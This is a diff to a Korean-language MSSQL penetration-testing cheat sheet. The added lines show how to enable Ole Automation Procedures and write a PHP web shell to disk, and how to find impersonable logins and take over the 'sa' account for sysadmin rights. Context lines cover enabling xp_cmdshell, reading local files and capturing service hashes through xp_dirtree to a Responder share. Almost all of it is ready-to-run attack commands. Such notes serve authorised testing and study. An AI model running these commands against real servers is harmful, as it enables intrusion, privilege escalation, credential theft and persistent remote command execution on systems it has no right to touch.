@@ -96,6 +96,14 @@ rpcclient $> enumdomusers
 로컬 계정 : ```sqsh -S 192.168.1.1 -U .\\<user> -P <password> -h```<br/>
 ```mssqlclient.py -p 1433 <user>@192.168.1.1 -windows-auth```
 
+### 주요 쿼리
+| Command                                                  | Description                        |
+| -------------------------------------------------------- | ---------------------------------- |
+| SELECT name FROM master.dbo.sysdatabases                 | Show databases                     |
+| USE users                                                | Use a database                     |
+| SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES   | Show tables from users database    |
+| SELECT * FROM users                                      | Select all Data from Table "users" |
+
 ### XP_CMDSHELL 활성화
 ```
 EXECUTE sp_configure 'show advanced options', 1
@@ -107,12 +115,52 @@ xp_cmdshell 'whoami'
 ### 로컬 파일 읽기
 ```SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents```
 
+### 파일 쓰기 (Ole Automation Procedures)
+- Ole Automation Procedures 활성화
+```
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+```
+- 파일 생성
+```
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\path\to\your\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+
 ### MSSQL Service Hash 캡쳐
 - 먼저 `Responder`나 `impacket-smbserver`를 시작해야 함
 ```
 EXEC master..xp_dirtree '\\192.168.1.1\share\'
   또는
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
+```
+
+### 기존 사용자 가장하기
+- 가장할 수 있는 사용자 식별
+```
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+- 현재 사용자에게 sysadmin 역할이 있는지 확인(반환값 0)
+```
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+- 
+``` sa 사용자로 사칭하고 sysadmin 역할 확인(반환값 1)
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
 ### linked Servers 식별
